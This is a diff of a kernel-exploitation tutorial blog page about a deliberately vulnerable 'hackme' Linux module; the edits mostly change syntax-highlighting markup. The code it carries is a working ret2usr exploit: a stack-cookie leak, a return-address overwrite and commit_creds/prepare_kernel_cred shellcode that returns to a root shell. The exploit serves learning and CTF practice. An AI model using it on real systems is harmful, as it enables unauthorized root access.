@@ -10,7 +10,6 @@
 <meta property="og:url" content="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/" /><meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-01-23T16:33:12+07:00" />
 <meta property="article:modified_time" content="2021-01-23T16:33:12+07:00" /><meta property="og:site_name" content="My cool site" />
-
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>
 
@@ -250,36 +249,36 @@
 <h2 id="analyzing-the-kernel-module">Analyzing the kernel module</h2>
 <p>The module is absolutely simple. First, in <code>hackme_init()</code>, it registers a device named <code>hackme</code> with the following operations: <code>hackme_read</code>, <code>hackme_write</code>, <code>hackme_open</code> and <code>hackme_release</code>. This means that we can communicate with this module by opening <code>/dev/hackme</code> and perform read or write on it.</p>
 <p>Performing read or write on the device will make a call to <code>hackme_read()</code> or <code>hackme_write()</code> in the kernel, their code is as follow (using IDA pro, some irrelevant parts are omitted):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>   
 </span></span><span class="line"><span class="cl">    <span class="c1">//...
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">//...
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">BUG</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BUG</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">_memcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_memcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">//...
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>   
 </span></span><span class="line"><span class="cl">    <span class="c1">//...
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">//...
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">_memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">_memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">BUG</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BUG</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="nf">copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">//...
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
 </span></span></code></pre></div><p>The bugs in these 2 functions are pretty clear: They both read/write to a stack buffer that is 0x80 bytes in length, but only alert a buffer overflow if the size is larger than 0x1000. Using this bug, we can freely read from/write to the kernel stack.</p>
@@ -295,12 +294,12 @@
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">open_dev</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">    <span class="n">global_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">global_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">global_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>After doing this, we can now read and write to <code>global_fd</code>.</p>
@@ -311,11 +310,11 @@
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">    <span class="n">cookie</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h3 id="overwriting-return-address">Overwriting return address</h3>
 <p>The situation here is the same as leaking, we will create an <code>unsigned long</code> array, then overwrite the cookie with our leaked cookie at index 16. The important thing to note here is that different from <code>userland</code> programs, this kernel function actually pops 3 registers from the stack, namely <code>rbx</code>, <code>r12</code>, <code>rbp</code> instead of just <code>rbp</code> (this can clearly be seen in the disassembly of the functions). Therefore, we have to put 3 dummy values after the cookie. Then the next value will be the return address that we want our program to return into, which is the function that we will craft on the <code>userland</code> to achieve root privileges, I called it <code>escalate_privs</code>:</p>
@@ -329,15 +328,15 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">;</span> <span class="c1">// ret
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>The final concern here is what do we actually write in that function to achieve root privileges.</p>
 <h3 id="getting-root-privileges">Getting root privileges</h3>
 <p>Again, just as a reminder, our goal in kernel exploitation is not to pop a shell via <code>system(&quot;/bin/sh&quot;)</code> or <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>, but it is to achieve root privileges in the system, then pop a root shell. Typically, the most common way to do this is by using the 2 functions called <code>commit_creds()</code> and <code>prepare_kernel_cred()</code>, which are functions that already reside in the kernel-space code itself. What we need to do is to call the 2 functions like this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">commit_creds</span><span class="p">(</span><span class="nf">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
 </span></span></code></pre></div><p>Since <code>KASLR</code> is disabled, the addresses where these functions reside in is constant across every boot. Therefore, we can just easily get those addresses by reading <code>/proc/kallsyms</code> file using these shell commands:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /proc/kallsyms <span class="p">|</span> grep commit_creds
 </span></span><span class="line"><span class="cl">-&gt; ffffffff814c6410 T commit_creds
@@ -345,7 +344,7 @@
 </span></span><span class="line"><span class="cl">-&gt; ffffffff814c67f0 T prepare_kernel_cred
 </span></span></code></pre></div><p>Then the code to achieve root privileges can be written as follows (you can write it in many different ways, it&rsquo;s just simply calling 2 functions consecutively using one&rsquo;s return value as the other&rsquo;s parameter, I just saw this in a writeup and copied it):</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
@@ -369,7 +368,7 @@
 <p>Basically, if the kernel runs normally, it will return to userland using 1 of these instructions (in x86_64): <code>sysretq</code> or <code>iretq</code>. The typical way that most people use is through <code>iretq</code>, because as far as I know, <code>sysretq</code> is more complicated to get right. The <code>iretq</code> instruction just requires the stack to be setup with <strong>5 userland register values</strong> in this order: <code>RIP|CS|RFLAGS|SP|SS</code>.</p>
 <p>The process keeps track of 2 different sets of values for these registers, one for <code>user-mode</code> and one for <code>kernel-mode</code>. Therefore, after finishing executing in <code>kernel-mode</code>, it must revert back to the <code>user-mode</code> values for these registers. For <code>RIP</code>, we can simply set this to be the address of the function that pops a shell. However, for the other registers, if we just set them to be something random, the process may not continue execution as expected. To solve this problem, people have thought of a very clever way: <em>save the state of these registers before going into kernel-mode, then reload them after gaining root privileges</em>. The function to save their states is as follow:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">save_state</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_cs, cs;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_ss, ss;&#34;</span>
@@ -378,13 +377,13 @@
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;pop user_rflags;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;.att_syntax;&#34;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Saved state&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Saved state&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>And one more thing, on x86_64, one more instruction called <code>swapgs</code> must be called before <code>iretq</code>. The purpose of this instruction is to also swap the <code>GS</code> register between <code>kernel-mode</code> and <code>user-mode</code>. With all those information, we can finish the code to gain root privileges, then return to <code>user-mode</code>:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
@@ -408,11 +407,11 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>We can finally call those pieces that we have crafted one by one, in the correct order, to open a root shell:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">save_state</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">open_dev</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">leak</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">overflow</span><span class="p">();</span>  
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">save_state</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">open_dev</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">leak</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">overflow</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
@@ -448,7 +447,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.99.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                 </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
